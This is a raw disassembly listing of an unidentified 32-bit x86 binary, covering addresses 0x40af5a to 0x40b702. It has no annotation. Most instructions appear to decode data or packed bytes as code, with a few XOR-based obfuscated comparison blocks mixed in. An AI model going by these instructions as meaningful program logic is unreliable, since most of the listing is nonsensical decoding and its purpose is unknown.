  40af5a:	xor    BYTE PTR [ebx-0x6a56e2c8],bh
  40af60:	xchg   esi,eax
  40af61:	and    dl,BYTE PTR [eax+0x505553e4]
  40af67:	mov    eax,ds:0xf379bb84
  40af6c:	pop    ss
  40af6d:	inc    ecx
  40af6e:	std    
  40af6f:	jl     0x40af7a
  40af71:	push   cs
  40af72:	push   eax
  40af73:	pop    esi
  40af74:	jo     0x40af08
  40af76:	cmp    BYTE PTR [esi+eiz*2],ch
  40af79:	rcl    BYTE PTR [edx+ebp*2],1
  40af7c:	and    edi,ebx
  40af7e:	adc    ebp,DWORD PTR [esi+0x73a0f24a]
  40af84:	sub    bh,BYTE PTR [esi-0x7f998aa1]
  40af8a:	dec    ebx
  40af8b:	sub    BYTE PTR [edi],al
  40af8d:	add    al,0x4e
  40af8f:	test   cl,0xcd
  40af92:	add    DWORD PTR [edi-0x5e],esp
  40af95:	gs cmp dh,bl
  40af98:	jns    0x40b005
  40af9a:	sbb    edi,DWORD PTR [eax]
  40af9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af9d:	repnz sbb al,0x63
  40afa0:	add    ebp,DWORD PTR [ecx-0x59]
  40afa3:	fistp  WORD PTR [edi-0x610ca990]
  40afa9:	cmp    cl,ah
  40afab:	std    
  40afac:	sar    ch,cl
  40afae:	xchg   ecx,eax
  40afaf:	pop    ebx
  40afb0:	std    
  40afb1:	mov    ecx,0xbe44c636
  40afb6:	scas   al,BYTE PTR es:[edi]
  40afb7:	sub    edi,ebp
  40afb9:	inc    edi
  40afba:	aas    
  40afbb:	nop
  40afbc:	jg     0x40afba
  40afbe:	shr    BYTE PTR fs:[edx],0xe8
  40afc2:	out    dx,eax
  40afc3:	pop    ss
  40afc4:	cwde   
  40afc5:	mov    ch,0xd
  40afc7:	push   es
  40afc8:	cmp    BYTE PTR [ebx-0x13],al
  40afcb:	push   eax
  40afcc:	mov    bh,BYTE PTR [edx-0x740ba277]
  40afd2:	add    BYTE PTR [esi-0x75],ah
  40afd5:	dec    ebp
  40afd6:	cld    
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     cl,BYTE PTR [esi+0x79dc6655]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	jp     0x40b018
  40b005:	mov    ah,0xbf
  40b007:	daa    
  40b008:	mov    esi,0xf540fade
  40b00d:	pop    ebp
  40b00e:	dec    edx
  40b00f:	jae    0x40b00b
  40b011:	lds    ecx,FWORD PTR [edx+0x17]
  40b014:	xor    ebp,DWORD PTR [ecx+0x6c8735c2]
  40b01a:	mov    eax,0x31f80889
  40b01f:	aad    0x31
  40b021:	xor    ebp,ebx
  40b023:	xchg   esi,eax
  40b024:	icebp  
  40b025:	sub    bh,cl
  40b027:	push   0xb2b20ee
  40b02c:	ret    
  40b02d:	into   
  40b02e:	cmp    DWORD PTR [ebx],0x3830689c
  40b034:	inc    esi
  40b035:	popa   
  40b036:	pop    esi
  40b037:	inc    esp
  40b038:	sbb    al,0x7f
  40b03a:	dec    ebx
  40b03c:	out    dx,al
  40b03d:	add    esp,DWORD PTR [edx]
  40b03f:	xor    al,0xc6
  40b041:	push   0x8d25cf54
  40b046:	pop    ebp
  40b047:	or     DWORD PTR [esi-0x6c],ecx
  40b04a:	out    0xba,al
  40b04c:	cmp    DWORD PTR ds:0xb7e97516,ecx
  40b052:	aas    
  40b053:	mov    bh,0x8a
  40b055:	push   0x0
  40b057:	mov    ebp,0x3ccc2579
  40b05c:	popf   
  40b05d:	clc    
  40b05e:	shr    BYTE PTR [ebp-0x7c],1
  40b061:	xor    al,0x2f
  40b063:	mov    al,ds:0x29cf30ec
  40b068:	add    BYTE PTR [edi+0xae31125],bh
  40b06e:	fldenv [ebx]
  40b070:	dec    edx
  40b071:	out    0x6f,eax
  40b073:	neg    BYTE PTR [edi+0x4]
  40b076:	cli    
  40b077:	add    eax,0x96b14663
  40b07c:	dec    edi
  40b07d:	jmp    esp
  40b07f:	test   BYTE PTR [eax+0x7d92a451],dh
  40b085:	mov    bh,0xbb
  40b087:	and    eax,0x5a63a7d9
  40b08c:	mov    ss,WORD PTR [eax+ebp*4]
  40b08f:	add    al,0xf9
  40b091:	shl    DWORD PTR [edi+edx*1+0x79b1a738],1
  40b098:	icebp  
  40b099:	and    DWORD PTR [ebx-0x218a8575],ebx
  40b09f:	das    
  40b0a0:	(bad)  
  40b0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0a2:	sbb    ebx,DWORD PTR [ebp-0x15]
  40b0a5:	add    BYTE PTR ds:0xfaa54391,0xdb
  40b0ac:	push   esp
  40b0ad:	sbb    eax,0x4629ccac
  40b0b2:	addr16 jnp 0x40b0e6
  40b0b5:	pop    edi
  40b0b6:	mov    esp,0xd4109ddb
  40b0bb:	pop    ds
  40b0bc:	adc    esp,ecx
  40b0be:	cs ds pop esp
  40b0c1:	sti    
  40b0c2:	ret    
  40b0c3:	inc    ebx
  40b0c4:	fsubrp st(4),st
  40b0c6:	mov    edi,0xd7c7690b
  40b0cb:	cmp    ch,dh
  40b0cd:	push   0xafd967ed
  40b0d2:	lods   eax,DWORD PTR ds:[esi]
  40b0d3:	outs   dx,DWORD PTR ds:[esi]
  40b0d4:	and    eax,0x92b1978d
  40b0d9:	shr    BYTE PTR [ebp+0x6b76e49b],1
  40b0df:	or     eax,esi
  40b0e1:	or     al,0x14
  40b0e3:	push   ecx
  40b0e4:	xor    BYTE PTR [eax+0x4e610012],bl
  40b0ea:	cdq    
  40b0eb:	fimul  DWORD PTR [esi-0x1be74f62]
  40b0f1:	cmc    
  40b0f2:	sub    DWORD PTR es:[edx+0x580abeba],eax
  40b0f9:	into   
  40b0fa:	int    0x7
  40b0fc:	add    al,0xce
  40b0fe:	ret    0xa19f
  40b101:	dec    ebx
  40b102:	xchg   edi,eax
  40b103:	jbe    0x40b0bd
  40b105:	dec    eax
  40b106:	dec    eax
  40b107:	outs   dx,BYTE PTR ds:[esi]
  40b108:	mov    eax,ds:0x7d6c1e9d
  40b10d:	(bad)  
  40b10e:	fwait
  40b10f:	adc    ecx,DWORD PTR [edi-0x13]
  40b112:	fisub  DWORD PTR [esi+0x59]
  40b115:	jg     0x40b153
  40b117:	inc    edi
  40b118:	xor    BYTE PTR [eax+0xf],0x6e
  40b11c:	sub    BYTE PTR [edx+edx*2-0x4011ad72],0xa7
  40b124:	js     0x40b186
  40b126:	mov    eax,ds:0x56daeff1
  40b12b:	ds and al,0xe8
  40b12e:	js     0x40b0dd
  40b130:	mov    dl,0x7
  40b132:	mov    edi,DWORD PTR [edi]
  40b134:	xchg   BYTE PTR [edi+edx*1-0x76],al
  40b138:	or     DWORD PTR ds:0x5dd2655f,ebp
  40b13e:	dec    edx
  40b13f:	and    ebp,edi
  40b141:	jbe    0x40b1a8
  40b143:	test   DWORD PTR [ecx+0x30],ebx
  40b146:	sub    eax,DWORD PTR [edi]
  40b148:	sbb    BYTE PTR [esi+0x7048d332],0xf9
  40b14f:	sti    
  40b150:	mov    ch,dh
  40b152:	xchg   edi,eax
  40b153:	(bad)  
  40b154:	xchg   edi,eax
  40b155:	loope  0x40b1a0
  40b157:	(bad)  
  40b158:	fndisi(8087 only) 
  40b15a:	inc    ebp
  40b15b:	and    ecx,eax
  40b15d:	paddsb mm5,QWORD PTR [ecx+0x3747cdb3]
  40b164:	inc    edx
  40b165:	sar    BYTE PTR [ebx],0xd8
  40b168:	popa   
  40b169:	pop    esp
  40b16a:	aas    
  40b16b:	sbb    BYTE PTR [edx-0x26],bh
  40b16e:	mov    bh,0xd2
  40b170:	and    eax,0x37f1830
  40b175:	arpl   WORD PTR [eax-0x24],di
  40b178:	enter  0x3475,0xa2
  40b17c:	sbb    DWORD PTR ds:0x5a554b96,ecx
  40b182:	sub    BYTE PTR [ecx],0x8b
  40b185:	and    DWORD PTR [ecx-0x22],ebp
  40b188:	mov    dl,bl
  40b18a:	adc    eax,0x6009a297
  40b18f:	cld    
  40b190:	call   0xe50f6cc1
  40b195:	test   al,0xed
  40b197:	out    dx,al
  40b198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b199:	or     esi,DWORD PTR [edx]
  40b19b:	aad    0x14
  40b19d:	lahf   
  40b19e:	out    dx,eax
  40b19f:	fldcw  WORD PTR [ebp+0xd]
  40b1a2:	scas   eax,DWORD PTR es:[edi]
  40b1a3:	ret    0xd079
  40b1a6:	popf   
  40b1a7:	xchg   esp,eax
  40b1a8:	and    bh,al
  40b1aa:	ss inc edx
  40b1ac:	or     DWORD PTR [edi],ebp
  40b1ae:	xlat   BYTE PTR ds:[ebx]
  40b1af:	inc    eax
  40b1b0:	and    esi,DWORD PTR [edi+ecx*4]
  40b1b3:	push   ds
  40b1b4:	xchg   ecx,eax
  40b1b5:	cli    
  40b1b6:	ja     0x40b177
  40b1b8:	shrd   DWORD PTR [eax-0x48],ecx,cl
  40b1bc:	jne    0x40b16f
  40b1be:	xor    dl,ch
  40b1c0:	or     esi,DWORD PTR [ebx+0x66fc631f]
  40b1c6:	sti    
  40b1c7:	push   es
  40b1c8:	pusha  
  40b1c9:	(bad)  
  40b1ca:	push   esp
  40b1cb:	push   edi
  40b1cc:	xor    DWORD PTR [eax-0x37d73678],edx
  40b1d2:	leave  
  40b1d3:	scas   al,BYTE PTR es:[edi]
  40b1d4:	bound  ebp,QWORD PTR [ecx]
  40b1d6:	xor    edi,DWORD PTR ds:0x6dec1a0b
  40b1dc:	data16 mov dl,0x62
  40b1df:	xor    esp,DWORD PTR [ebp+ecx*4-0x74bcfe44]
  40b1e6:	jl     0x40b1b3
  40b1e8:	mov    ebp,0x8a1705f2
  40b1ed:	fs inc edi
  40b1ef:	xchg   al,ah
  40b1f1:	mov    bh,0x37
  40b1f3:	jp     0x40b182
  40b1f5:	leave  
  40b1f6:	div    DWORD PTR [esi-0x1c08e01e]
  40b1fc:	pop    ebp
  40b1fd:	mov    ds:0x155f9289,al
  40b202:	mov    bh,0x8f
  40b204:	ins    DWORD PTR es:[edi],dx
  40b205:	mov    al,0xb7
  40b207:	mov    bh,0x82
  40b209:	fistp  QWORD PTR [edx-0x53a86e4b]
  40b20f:	push   ds
  40b210:	fdiv   st(3),st
  40b212:	cmp    al,BYTE PTR [ebp-0x1e7a99a4]
  40b218:	mov    bl,0x33
  40b21a:	inc    esi
  40b21b:	sbb    ecx,DWORD PTR ds:[edx-0x56]
  40b21f:	sub    BYTE PTR [edx],0xed
  40b222:	aas    
  40b223:	int3   
  40b224:	cs je  0x40b1b8
  40b227:	loope  0x40b1aa
  40b229:	std    
  40b22a:	inc    esi
  40b22b:	mov    DWORD PTR [edi],ecx
  40b22d:	popf   
  40b22e:	jb     0x40b23e
  40b230:	push   es
  40b231:	pop    esp
  40b232:	mov    di,0x42c2
  40b236:	push   esp
  40b237:	iret   
  40b238:	call   0xc920:0x5ec408d2
  40b23f:	(bad)  
  40b241:	iret   
  40b242:	push   edx
  40b243:	leave  
  40b244:	je     0x40b23f
  40b246:	pusha  
  40b247:	ficom  DWORD PTR [eax+0x64]
  40b24a:	(bad)  
  40b24b:	mov    es:0x2903476,eax
  40b251:	cld    
  40b252:	inc    ecx
  40b253:	push   edx
  40b254:	je     0x40b2a4
  40b256:	es (bad) 
  40b258:	mov    cl,0x36
  40b25a:	pop    ebx
  40b25b:	jp     0x40b280
  40b25d:	jb     0x40b218
  40b25f:	movups XMMWORD PTR ds:0x24f1e54d,xmm0
  40b266:	adc    eax,0x1f237c1d
  40b26b:	shr    edx,0x2b
  40b26e:	mov    es,esp
  40b270:	and    DWORD PTR [ebx-0x2b],0xffffffea
  40b274:	enter  0x45b3,0x6a
  40b278:	dec    ebp
  40b279:	rcl    BYTE PTR [edi+0x38e82f6a],0x19
  40b280:	aad    0x69
  40b282:	jns    0x40b2a8
  40b284:	adc    cl,BYTE PTR [edi]
  40b286:	mov    ds:0x2ea06b3a,eax
  40b28b:	rcr    DWORD PTR [edi],1
  40b28d:	fldcw  WORD PTR [edx]
  40b28f:	adc    dh,BYTE PTR [ebx-0xc]
  40b292:	pop    ds
  40b293:	push   esp
  40b294:	scas   eax,DWORD PTR es:[edi]
  40b295:	ins    DWORD PTR es:[edi],dx
  40b296:	mov    edi,0x3d30001d
  40b29b:	xchg   esp,eax
  40b29c:	dec    ebp
  40b29d:	icebp  
  40b29e:	popf   
  40b29f:	cli    
  40b2a0:	das    
  40b2a1:	jle    0x40b234
  40b2a3:	loope  0x40b318
  40b2a5:	pusha  
  40b2a6:	mov    edx,0x8840473d
  40b2ab:	jmp    0xb0d1:0xc50dfc31
  40b2b2:	and    esp,DWORD PTR [eax-0x837dc5]
  40b2b8:	repz sbb al,0x2c
  40b2bb:	test   al,0x82
  40b2bd:	cld    
  40b2be:	call   0x2162:0xa74da37e
  40b2c5:	fsub   DWORD PTR [ecx-0x3c]
  40b2c8:	cmp    al,0x0
  40b2ca:	jg     0x40b24c
  40b2cc:	fs call 0x842c:0xb16c7794
  40b2d4:	mov    bh,dl
  40b2d6:	stos   BYTE PTR es:[edi],al
  40b2d7:	add    al,0xc6
  40b2d9:	and    ch,al
  40b2db:	call   0xec5:0xb1e08fc7
  40b2e2:	xchg   edi,eax
  40b2e3:	(bad)  [edi-0x56535618]
  40b2e9:	bound  eax,QWORD PTR [ecx+ecx*2+0x24fc00a7]
  40b2f0:	add    ch,BYTE PTR [eax+ebp*1]
  40b2f3:	retf   0x16b7
  40b2f6:	popf   
  40b2f7:	adc    al,0xc
  40b2f9:	sub    dl,BYTE PTR [eax]
  40b2fb:	jmp    0xf83d:0x8b4722ba
  40b302:	xor    DWORD PTR [eax],ebx
  40b304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b305:	mov    ds:0xf246765b,eax
  40b30a:	sbb    eax,edi
  40b30c:	adc    eax,0x82b792cf
  40b311:	or     al,dh
  40b313:	cwde   
  40b314:	jno    0x40b2cb
  40b316:	push   ebp
  40b317:	xchg   DWORD PTR [eax],ebp
  40b319:	popf   
  40b31a:	loop   0x40b324
  40b31c:	mov    ebx,fs
  40b31e:	rcl    BYTE PTR [edi+0x52],cl
  40b321:	(bad)  
  40b322:	imul   esp,DWORD PTR [edx+ebp*2-0x41f2d3c0],0xbd5cd2d3
  40b32d:	mov    ds:0x34791794,eax
  40b332:	inc    ecx
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	add    ebp,0x46
  40b377:	out    dx,al
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b322
  40b381:	add    BYTE PTR [esi],cl
  40b383:	add    al,0x2d
  40b385:	mov    ch,0xd8
  40b387:	jbe    0x40b354
  40b389:	or     ch,0x3f
  40b38c:	int    0x8c
  40b38e:	(bad)  
  40b38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b390:	mov    dl,0x79
  40b392:	fnstcw WORD PTR ds:0x1ba6e63a
  40b398:	push   esp
  40b399:	or     al,0xae
  40b39b:	add    BYTE PTR [ebp-0x2ae0e707],bh
  40b3a1:	in     eax,0x71
  40b3a3:	and    cl,cl
  40b3a5:	scas   eax,DWORD PTR es:[edi]
  40b3a6:	jns    0x40b37c
  40b3a8:	inc    esp
  40b3a9:	pusha  
  40b3aa:	in     al,0xe3
  40b3ac:	cs inc esp
  40b3ae:	lods   al,BYTE PTR ds:[esi]
  40b3af:	xor    BYTE PTR [ecx-0x5091ea4c],bh
  40b3b5:	inc    edx
  40b3b6:	add    BYTE PTR [ebx],dh
  40b3b8:	icebp  
  40b3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ba:	pop    edi
  40b3bb:	call   0x51af2294
  40b3c0:	outs   dx,BYTE PTR ds:[esi]
  40b3c1:	sub    edi,DWORD PTR [edx-0x11]
  40b3c4:	mov    ah,0x93
  40b3c6:	fist   DWORD PTR [eax-0x6e]
  40b3c9:	(bad)  
  40b3ca:	test   DWORD PTR [ebx-0x76],0x84624a76
  40b3d1:	mov    DWORD PTR [eax-0x65588e68],ecx
  40b3d7:	dec    eax
  40b3d8:	mov    dh,0x98
  40b3da:	xor    esi,DWORD PTR [ecx-0x2f31bfbf]
  40b3e0:	cdq    
  40b3e1:	xchg   edi,eax
  40b3e2:	jge    0x40b429
  40b3e4:	cmp    al,0xb2
  40b3e6:	jb     0x40b3d7
  40b3e8:	or     dh,BYTE PTR ds:0xd7c16fbb
  40b3ee:	(bad)  
  40b3ef:	push   0xcdb9508d
  40b3f4:	out    0x2c,eax
  40b3f6:	sbb    ch,0xe9
  40b3f9:	cmp    eax,0x7ec22da2
  40b3fe:	mov    ecx,0x296ba3fa
  40b403:	jae    0x40b435
  40b405:	mov    eax,0x3c2a7e2f
  40b40a:	xchg   bl,cl
  40b40c:	lea    eax,[edx-0x72]
  40b40f:	mov    ds:0x5ca66fdf,al
  40b414:	fdivp  st(0),st
  40b416:	add    ecx,edi
  40b418:	and    esi,edi
  40b41a:	pushf  
  40b41b:	adc    al,0xd7
  40b41d:	pusha  
  40b41e:	jnp    0x40b47c
  40b420:	test   DWORD PTR [edx+0x7bce0aa4],eax
  40b426:	inc    edx
  40b427:	ins    DWORD PTR es:[edi],dx
  40b428:	mov    ecx,0x20823c9b
  40b42d:	ret    0x8434
  40b430:	cmp    ecx,ebp
  40b432:	adc    DWORD PTR [ebx],0x2e
  40b435:	jb     0x40b49e
  40b437:	inc    eax
  40b438:	pop    esi
  40b439:	ds test ecx,esp
  40b43c:	mov    al,0xed
  40b43e:	xor    bh,bh
  40b440:	push   esi
  40b441:	ss imul edi,ebx,0x6a
  40b445:	ja     0x40b419
  40b447:	jp     0x40b49e
  40b449:	leave  
  40b44a:	and    BYTE PTR [ecx+eax*1+0x12b1063b],ah
  40b451:	jle    0x40b4c0
  40b453:	aaa    
  40b454:	add    al,0x6f
  40b456:	pop    ss
  40b457:	(bad)  
  40b458:	hlt    
  40b459:	mov    esp,0xe6b09007
  40b45e:	shr    BYTE PTR [esi],0x2a
  40b461:	xor    BYTE PTR [ebx+0x711cbffc],bh
  40b467:	and    edx,DWORD PTR [eax-0x2c35742c]
  40b46d:	mov    ecx,0xe5bea90e
  40b472:	inc    ecx
  40b473:	mov    ch,cl
  40b475:	mov    BYTE PTR [ecx+0x32e225c3],ch
  40b47b:	(bad)  
  40b47c:	xchg   esp,eax
  40b47d:	repnz mul BYTE PTR [ebx]
  40b480:	stos   DWORD PTR es:[edi],eax
  40b481:	scas   al,BYTE PTR es:[edi]
  40b482:	fdiv   QWORD PTR [esi+0x77a12885]
  40b488:	push   ecx
  40b489:	mov    eax,0x21b1d515
  40b48e:	push   eax
  40b48f:	inc    edi
  40b490:	inc    ebp
  40b491:	mov    BYTE PTR [ebx+edx*1],cl
  40b494:	pop    ds
  40b495:	pop    esi
  40b496:	xchg   edi,eax
  40b497:	ret    0xc634
  40b49a:	ror    BYTE PTR [ebx],cl
  40b49c:	jg     0x40b4ac
  40b49e:	test   eax,0x8238c5f1
  40b4a3:	cs jmp 0xd78e:0xe2a90c7a
  40b4ab:	xor    BYTE PTR [esi*8-0xdebbad8],bl
  40b4b2:	into   
  40b4b3:	ret    0x67ce
  40b4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4b7:	and    eax,0xf1029324
  40b4bc:	inc    ebp
  40b4bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4be:	mov    al,0x79
  40b4c0:	std    
  40b4c1:	fs and al,0x7d
  40b4c4:	lahf   
  40b4c5:	add    cl,BYTE PTR [esi]
  40b4c7:	xlat   BYTE PTR ds:[ebx]
  40b4c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4c9:	ins    BYTE PTR es:[edi],dx
  40b4ca:	jbe    0x40b53f
  40b4cc:	mov    edx,0x7abdbf5a
  40b4d1:	das    
  40b4d2:	or     ecx,edi
  40b4d4:	aam    0xe2
  40b4d6:	hlt    
  40b4d7:	sbb    BYTE PTR [esi+0x49],ch
  40b4da:	dec    edi
  40b4db:	jns    0x40b4d9
  40b4dd:	ficom  WORD PTR [ecx+0x2f]
  40b4e0:	or     DWORD PTR [edi],0x44
  40b4e3:	daa    
  40b4e4:	(bad)  
  40b4e6:	cli    
  40b4e7:	sbb    esi,ebx
  40b4e9:	es dec edx
  40b4eb:	cmp    al,0x29
  40b4ed:	les    esi,FWORD PTR [edi+0x41356d20]
  40b4f3:	mov    ah,0xe
  40b4f5:	fdiv   QWORD PTR [ecx-0x30]
  40b4f8:	add    BYTE PTR [esi+0x4c93b01d],0x63
  40b4ff:	jne    0x40b540
  40b501:	(bad)  
  40b502:	stc    
  40b503:	push   es
  40b504:	cdq    
  40b505:	psubusw mm0,QWORD PTR [edi-0xf]
  40b509:	hlt    
  40b50a:	pop    ss
  40b50b:	mov    ch,0x5f
  40b50d:	jbe    0x40b4ec
  40b50f:	fst    QWORD PTR [ecx]
  40b511:	fmul   DWORD PTR [ecx-0x54624405]
  40b517:	stos   BYTE PTR es:[edi],al
  40b518:	jae    0x40b4a0
  40b51a:	adc    eax,0xe2b346
  40b51f:	fld    TBYTE PTR [esi+0x70]
  40b522:	add    DWORD PTR [edi],ecx
  40b524:	enter  0x76fd,0xca
  40b528:	and    al,0xed
  40b52a:	push   esp
  40b52b:	xchg   ebp,eax
  40b52c:	scas   eax,DWORD PTR es:[edi]
  40b52d:	pop    ds
  40b52e:	or     al,0xe0
  40b530:	inc    eax
  40b531:	das    
  40b532:	ins    DWORD PTR es:[edi],dx
  40b533:	push   ebx
  40b534:	mov    ebp,0x7a9d5c79
  40b539:	lock ficomp WORD PTR [ecx-0x57]
  40b53d:	dec    esi
  40b53e:	lahf   
  40b53f:	xchg   esp,eax
  40b540:	cwde   
  40b541:	mov    ebp,0x630a692b
  40b546:	das    
  40b547:	mov    bl,0xc3
  40b549:	mov    bh,BYTE PTR [ecx-0x4f]
  40b54c:	cwde   
  40b54d:	push   0xd8c2e083
  40b552:	mov    ebx,0x44bf6874
  40b557:	sub    DWORD PTR [eax],edx
  40b559:	mov    al,ds:0x4831167b
  40b55e:	out    dx,eax
  40b55f:	jmp    0x4327:0x9fd2e006
  40b566:	mov    edi,0x5ac809b7
  40b56b:	mov    dh,0x6a
  40b56d:	test   DWORD PTR [esi-0x49d0dd69],esi
  40b573:	adc    ecx,DWORD PTR [ecx-0x708693f7]
  40b579:	int    0xae
  40b57b:	dec    ebx
  40b57c:	div    BYTE PTR [ebp+0x1b]
  40b57f:	mov    ebp,0x938b7c2e
  40b584:	add    eax,0x54475e18
  40b589:	fimul  DWORD PTR [edx+0x2c]
  40b58c:	jecxz  0x40b539
  40b58e:	retf   0xbe2c
  40b591:	pop    ebp
  40b592:	fnsave [edi+0x6a660cac]
  40b598:	push   ebp
  40b599:	ds push es
  40b59b:	cld    
  40b59c:	outs   dx,BYTE PTR ds:[esi]
  40b59d:	sbb    eax,0x8e939295
  40b5a2:	gs jbe 0x40b5b0
  40b5a5:	imul   edi,DWORD PTR [edx-0x2b2c0bb6],0xf78f8aaf
  40b5af:	bound  esi,QWORD PTR [eax+ebx*4]
  40b5b2:	repz jns 0x40b57d
  40b5b5:	push   ecx
  40b5b6:	lods   al,BYTE PTR ds:[esi]
  40b5b7:	inc    ebp
  40b5b8:	mov    edx,0xafa15755
  40b5bd:	mov    ch,0xb4
  40b5bf:	pusha  
  40b5c0:	mov    ebx,0x5ae18619
  40b5c5:	push   edi
  40b5c6:	mov    esp,?
  40b5c8:	cmp    DWORD PTR [edx+0x39704e9b],edx
  40b5ce:	jae    0x40b60f
  40b5d0:	mov    BYTE PTR [esi+0x24],al
  40b5d3:	adc    eax,0x16f0cb66
  40b5d8:	pusha  
  40b5d9:	mov    ecx,0xf492191f
  40b5de:	sub    DWORD PTR [ecx-0x1334818f],esi
  40b5e4:	jge    0x40b645
  40b5e6:	repz leave 
  40b5e8:	sub    al,0x8f
  40b5ea:	dec    eax
  40b5eb:	cmp    eax,0xfb38d682
  40b5f0:	jl     0x40b5cd
  40b5f2:	mov    ah,0x5e
  40b5f4:	mov    ecx,0x143889b3
  40b5f9:	and    dh,BYTE PTR [edi-0x3b1eb9a3]
  40b5ff:	bound  ebx,QWORD PTR [edx]
  40b601:	pop    ss
  40b602:	add    DWORD PTR [ebp+0x28019290],0x4d
  40b609:	add    al,0x62
  40b60b:	pop    ds
  40b60c:	scas   eax,DWORD PTR es:[edi]
  40b60d:	jo     0x40b607
  40b60f:	daa    
  40b610:	std    
  40b611:	mov    esp,0x7e5cbebf
  40b616:	sub    eax,0x4011da1f
  40b61b:	push   edi
  40b61c:	xchg   ecx,eax
  40b61d:	inc    ebp
  40b61e:	iret   
  40b61f:	js     0x40b675
  40b621:	adc    DWORD PTR ds:0x2db85df6,esi
  40b627:	inc    edx
  40b628:	pop    ds
  40b629:	or     BYTE PTR [edx+0x3f],bh
  40b62c:	cmp    ecx,DWORD PTR [eax-0x12]
  40b62f:	les    esi,FWORD PTR [edx+edi*4-0x47]
  40b633:	and    dh,bh
  40b635:	shl    dl,cl
  40b637:	mov    BYTE PTR [edi],al
  40b639:	sub    dl,BYTE PTR [eax+0x7a]
  40b63c:	js     0x40b6a8
  40b63e:	shl    DWORD PTR [eax-0x3257c5f1],1
  40b644:	aad    0xcb
  40b646:	test   eax,0xab409a44
  40b64b:	xor    ebx,DWORD PTR [esi+ebx*4]
  40b64e:	mov    edi,es
  40b650:	sbb    dh,cl
  40b652:	js     0x40b655
  40b654:	xor    al,0x45
  40b656:	daa    
  40b657:	mov    bl,0x66
  40b659:	loop   0x40b67e
  40b65b:	cdq    
  40b65c:	(bad)  
  40b65d:	das    
  40b65e:	sbb    DWORD PTR [edx],0x78
  40b661:	mov    ah,BYTE PTR [edx]
  40b663:	push   ecx
  40b664:	mov    ds:0xd4e3b452,al
  40b669:	jp     0x40b6d7
  40b66b:	adc    eax,0xffa58528
  40b670:	adc    esp,DWORD PTR [ebx-0x6331d778]
  40b676:	sub    BYTE PTR [ebp+ebx*8-0x80],bh
  40b67a:	or     al,0x31
  40b67c:	scas   eax,DWORD PTR es:[edi]
  40b67d:	jae    0x40b6cb
  40b67f:	in     al,dx
  40b680:	popa   
  40b681:	push   es
  40b682:	mov    ebp,0xe75c49e4
  40b687:	inc    ebp
  40b688:	add    eax,DWORD PTR [eax-0x3]
  40b68b:	or     DWORD PTR [esi+eiz*4-0x60],edx
  40b68f:	xchg   esi,eax
  40b690:	out    0xe2,al
  40b692:	(bad)  
  40b693:	stos   DWORD PTR es:[edi],eax
  40b694:	sahf   
  40b695:	std    
  40b696:	ror    BYTE PTR [ebp+0x374c963],1
  40b69c:	dec    eax
  40b69d:	push   ecx
  40b69e:	outs   dx,BYTE PTR ds:[esi]
  40b69f:	pop    ds
  40b6a0:	xor    al,0xa
  40b6a2:	xor    edi,ebx
  40b6a4:	jae    0x40b6f4
  40b6a6:	test   eax,0x267b4f50
  40b6ab:	popf   
  40b6ac:	clc    
  40b6ad:	jge    0x40b682
  40b6af:	std    
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x3e
  40b6da:	jmp    0x40b689
  40b6dc:	mov    ecx,ds
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b731
  40b6e6:	xor    eax,0x3d480b2f
  40b6eb:	in     al,0x9b
  40b6ed:	pop    ebx
  40b6ee:	enter  0xb65,0x92
  40b6f2:	stos   BYTE PTR es:[edi],al
  40b6f3:	leave  
  40b6f4:	mov    ds:0x19e04823,al
  40b6f9:	leave  
  40b6fa:	push   edx
  40b6fb:	jmp    0x40b6e9
  40b6fd:	fs ffree st(1)
  40b700:	je     0x40b71a
  40b702:	stos   DWORD PTR es:[edi],eax
